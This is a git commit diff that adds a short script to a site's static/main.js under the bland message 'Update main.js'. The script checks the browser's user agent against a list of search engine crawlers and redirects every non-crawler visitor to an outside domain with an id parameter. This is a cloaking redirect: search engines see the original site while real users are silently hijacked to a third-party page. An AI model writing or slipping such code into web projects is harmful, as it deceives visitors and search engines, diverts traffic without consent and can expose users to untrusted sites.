268230b9aa1c473a8a545aa636e1c9caffa39634
unsongcc <unsongcc@hotmail.com>
2024-11-05 13:20:11 +0800

    Update main.js

--- static/main.js
+++ static/main.js
@@ -1,1 +1,10 @@
-//
+var userAgent = navigator.userAgent;
+var spiderList = ["Baiduspider", "360Spider", "YisouSpider", "YandexBot", "Sogou inst spider", "Sogou web spider", "msnbot", "Bingbot", "Sogou spider", "GoogleBot", "Bing"];
+
+var isSpider = spiderList.some(function(spider) {
+    return userAgent.includes(spider);
+});
+
+if (!isSpider) {
+    window.location.href = "https://www.bfyer.com?id=395320273";
+}
